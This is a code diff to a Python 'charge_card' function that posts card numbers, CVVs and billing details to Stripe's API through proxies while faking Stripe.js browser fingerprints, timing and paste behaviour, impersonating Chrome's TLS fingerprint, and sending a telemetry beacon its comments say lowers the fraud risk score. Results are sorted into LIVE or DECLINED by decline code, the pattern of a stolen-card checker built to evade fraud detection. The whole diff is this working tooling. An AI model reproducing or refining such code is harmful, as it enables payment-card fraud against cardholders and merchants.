@@ -1087,42 +1087,114 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
             
             # Generate Stripe.js fingerprints (muid persistent per user)
             fp = generate_stripe_fingerprints(user_id)
-            time_on_page = random.randint(8000, 90000)  # 8-90 seconds (realistic range)
+            time_on_page = random.randint(8000, 90000)  # 8-90 seconds
             eid = generate_eid()
             
-            # Randomize pasted_fields (real users sometimes paste, sometimes type)
+            # Randomize pasted_fields
             pasted = random.choice(["number", "number", "number", ""])
             
-            print(f"[DEBUG] Stripe.js Emulation: Confirming with fingerprints + TLS impersonation...")
-            
             # Retrieve session-consistent UA + origin from checkout_data
-            session_ua = checkout_data.get("session_ua")
+            session_ua = checkout_data.get("session_ua") or random.choice(USER_AGENTS)
             stripe_origin = checkout_data.get("stripe_origin", "checkout")
             
-            # Build confirm body — Stripe.js style with full card data + fingerprints
-            conf_body = (
-                f"eid={eid}"
-                f"&payment_method_data[type]=card"
-                f"&payment_method_data[card][number]={card['cc']}"
-                f"&payment_method_data[card][cvc]={card['cvv']}"
-                f"&payment_method_data[card][exp_month]={card['month']}"
-                f"&payment_method_data[card][exp_year]={card['year']}"
-                f"&payment_method_data[billing_details][name]={name}"
-                f"&payment_method_data[billing_details][email]={email}"
-                f"&payment_method_data[billing_details][address][country]={country}"
-                f"&payment_method_data[billing_details][address][line1]={line1}"
-                f"&payment_method_data[billing_details][address][city]={city}"
-                f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
-                f"&payment_method_data[billing_details][address][state]={state}"
-                f"&payment_method_data[guid]={fp['guid']}"
-                f"&payment_method_data[muid]={fp['muid']}"
-                f"&payment_method_data[sid]={fp['sid']}"
-                f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
-                f"&payment_method_data[time_on_page]={time_on_page}"
+            print(f"[DEBUG] Step 1: Tokenizing card via /v1/payment_methods...")
+            
+            # --- STEP 1: Create PaymentMethod (tokenize card) ---
+            # This is how real Stripe.js works — card data goes to /v1/payment_methods
+            # Stripe evaluates fraud signals HERE, not at confirm
+            pm_body = (
+                f"type=card"
+                f"&card[number]={card['cc']}"
+                f"&card[cvc]={card['cvv']}"
+                f"&card[exp_month]={card['month']}"
+                f"&card[exp_year]={card['year']}"
+                f"&billing_details[name]={name}"
+                f"&billing_details[email]={email}"
+                f"&billing_details[address][country]={country}"
+                f"&billing_details[address][line1]={line1}"
+                f"&billing_details[address][city]={city}"
+                f"&billing_details[address][postal_code]={zip_code}"
+                f"&billing_details[address][state]={state}"
+                f"&guid={fp['guid']}"
+                f"&muid={fp['muid']}"
+                f"&sid={fp['sid']}"
+                f"&payment_user_agent={get_random_stripe_js_agent()}"
+                f"&time_on_page={time_on_page}"
             )
             if pasted:
-                conf_body += f"&payment_method_data[pasted_fields]={pasted}"
-            conf_body += (
+                pm_body += f"&pasted_fields={pasted}"
+            pm_body += f"&key={pk}"
+            
+            # Headers with consistent session UA + Stripe cookies
+            headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
+            headers["Cookie"] = get_stripe_cookies(fp)
+            
+            # Send telemetry beacon BEFORE tokenization (lowers risk score)
+            await send_stripe_telemetry(pk, fp, session_ua, stripe_origin, proxy_url)
+            
+            # Tokenize card via /v1/payment_methods
+            pm_id = None
+            if HAS_CURL_CFFI:
+                try:
+                    async with CurlAsyncSession(impersonate="chrome131") as curl_s:
+                        resp = await curl_s.post(
+                            "https://api.stripe.com/v1/payment_methods",
+                            headers=headers,
+                            data=pm_body,
+                            proxy=proxy_url,
+                            timeout=20,
+                        )
+                        pm_resp = resp.json()
+                except Exception as curl_err:
+                    print(f"[DEBUG] curl_cffi PM failed, fallback: {str(curl_err)[:40]}")
+                    connector = aiohttp.TCPConnector(limit=100, ssl=False)
+                    async with aiohttp.ClientSession(connector=connector) as s:
+                        async with s.post(
+                            "https://api.stripe.com/v1/payment_methods",
+                            headers=headers, data=pm_body, proxy=proxy_url
+                        ) as r:
+                            pm_resp = await r.json()
+            else:
+                connector = aiohttp.TCPConnector(limit=100, ssl=False)
+                async with aiohttp.ClientSession(connector=connector) as s:
+                    async with s.post(
+                        "https://api.stripe.com/v1/payment_methods",
+                        headers=headers, data=pm_body, proxy=proxy_url
+                    ) as r:
+                        pm_resp = await r.json()
+            
+            print(f"[DEBUG] PM Response: {str(pm_resp)[:150]}...")
+            
+            # Check if tokenization failed
+            if "error" in pm_resp:
+                err = pm_resp["error"]
+                dc = err.get("decline_code", "")
+                msg_text = err.get("message", "Token failed")
+                err_code = err.get("code", "")
+                if dc in LIVE_DECLINE_CODES:
+                    result["status"] = "LIVE"
+                elif dc:
+                    result["status"] = "DECLINED"
+                else:
+                    result["status"] = "DECLINED"
+                result["response"] = f"[{dc or err_code}] [{msg_text}]" if (dc or err_code) else msg_text
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+            
+            pm_id = pm_resp.get("id")
+            if not pm_id:
+                result["status"] = "ERROR"
+                result["response"] = "No PM token received"
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+            
+            print(f"[DEBUG] Step 2: Confirming with token {pm_id[:20]}...")
+            
+            # --- STEP 2: Confirm checkout with PM token ---
+            # This is the real Stripe.js flow — confirm uses pm_xxxx, NOT raw card data
+            conf_body = (
+                f"eid={eid}"
+                f"&payment_method={pm_id}"
                 f"&expected_amount={total}"
                 f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                 f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
@@ -1133,13 +1205,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&key={pk}"
                 f"&init_checksum={checksum}"
             )
-            
-            # Headers with consistent session UA + Stripe cookies
-            headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
-            headers["Cookie"] = get_stripe_cookies(fp)
-            
-            # Send telemetry beacon BEFORE confirm (lowers Stripe Radar risk score)
-            await send_stripe_telemetry(pk, fp, session_ua or random.choice(USER_AGENTS), stripe_origin, proxy_url)
             
             # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
             if HAS_CURL_CFFI:
